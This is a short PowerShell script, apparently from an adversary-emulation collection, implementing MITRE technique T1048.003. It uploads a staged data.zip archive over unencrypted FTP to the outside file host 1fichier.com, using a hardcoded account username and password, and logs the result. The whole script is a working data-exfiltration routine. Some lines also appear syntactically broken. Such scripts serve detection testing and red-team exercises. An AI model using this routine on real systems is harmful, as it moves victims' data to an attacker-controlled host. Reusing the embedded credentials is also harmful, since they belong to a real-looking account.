# Exfiltrate archive using ftp
# Technic ID : T1048.003
Clear-Host
Write-Output "==============================================================================="
Write-Output "Exfiltratrion over Alternative Protocol: to 1fichier.com"
Write-Output "Exfiltration over unencrytpted Non-C2 protocol (T1048.003)"
Write-Output "==============================================================================="
#
$Username = "dikeses498@en2ch.com";
$Password = "8MXywqhkNzWNrUwVV8cL";
$Ftp = "ftp://ftp.1fichier.com"; 
$FtpPort = "21"; 
$ArchiveName = "data.zip";
$LocalStorageDir = "$env:PUBLIC\exf";
$LogFile = $LocalStorageDir"\ftp_exfiltration.txt";
$Slash = "/"; 
$AntiSlash = "\"; 
$Column = ":";
$FtpUri = "$Ftp$Column$FtpPort";
$FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";
Get-Date | Out-File -FilePath "$LogFile";
if ([System.IO.File]::Exists("$FullPathArchive")) 
{
    $ftp = [System.Net.FtpWebRequest]::Create("$FtpUri$Slash$ArchiveName");
    $ftp = [System.Net.FTPWebRequest]$ftp;
    $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
    $ftp.Credentials = New-Object System.Net.NetworkCredential("$Username", "$Password");
    $ftp.UseBinary = $true;
    $ftp.UsePassive = $true;
    $content = [System.IO.File]::ReadAllBytes("$FullPathArchive");
    $ftp.ContentLength = $content.Length;
    $requestStream = $ftp.GetRequestStream();
    $requestStream.Write($content, 0, $content.Length);
    $Result = "The file " + "$FullPathArchive" + " has been succefully uploaded to " + "$FtpUri";
    Write-Output "$Result" | Out-File -FilePath "$LogFile" -Append;
    $requestStream.Close();
    $requestStream.Dispose();
    exit 0;
};
else 
{ 
    "The file $FullPathArchive does not exists !!!" | Out-File -FilePath "$LogFile" -Append;
    exit 1;
};